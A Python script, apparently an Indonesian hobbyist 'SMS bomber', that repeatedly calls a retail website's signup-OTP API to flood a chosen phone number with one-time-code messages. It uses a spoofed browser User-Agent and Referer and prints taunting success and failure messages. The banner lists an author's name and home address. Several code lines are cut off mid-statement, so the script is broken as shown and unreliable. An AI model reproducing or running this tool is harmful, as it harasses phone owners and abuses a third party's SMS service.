import os, sys, time, requests
from requests import post

def lagi():
        l = input('\33[36;1mMau Spam Lagi Tod? [y/n]: ')
        if l == 'y':
                main()
        elif l == 'n':
                sys.exit()


def main():
        os.system('clear')
        os.system('figlet DKC')
        banner = '''
\33[36;1m+♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪+
\33[1;33m{♥} ♦Author♦ ≈ Ferdy Ardiansyah
\33[1;33m{♥} ♦Youtube♦≈ Dawet Tv
\33[1;33m{♥} ♦Alamat♦ ≈ Dsn3 DenaiKuala
\33[1;33m{♦} ♦Kec♦    ≈ Panta Labu
\33[1;33m{♥} ♦Kab♦    ≈ Deli Serdang
\33[1;33m{♥} ♦Kota♦   ≈ Medan
\33[1;33m ♣MAAF SLUR MINIMAL SPAMNYA HANYA 1
  KARENA WEBSITE NYA ADA YANG ERROR
  KALAU MAU SPAM BANYAK HARUS INSTALL
  SCRIPTNYA LAGI.MAAF YA SLUR SAYA GAK
  SEMPAT EDIT HTMLNYA♦
\33[36;1m+♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪+
'''

        print(banner)
        no = input('No hp Target Loh Tod : ')
        jml = int(input('Jumlah Spam : '))

        ua = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; M50 STAR Build/NRD90M                
        'Referer': 'https://www.mapclub.com/en/user/signup',
        }

        dat = {
        'phone': no,
        }

        sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp',                 

        for x in range(jml):
                time.sleep(3)
                if 'error' in sendSms.text:
                        print('Spam Sms '+ no + ' \33[31;1m[ MAMPUS LO GAGAL ]')                
                else:
                        print('Spam Sms '+ no + ' \33[31;1m[ Success Subscrib Dawet Tv ]')              

main()
lagi()
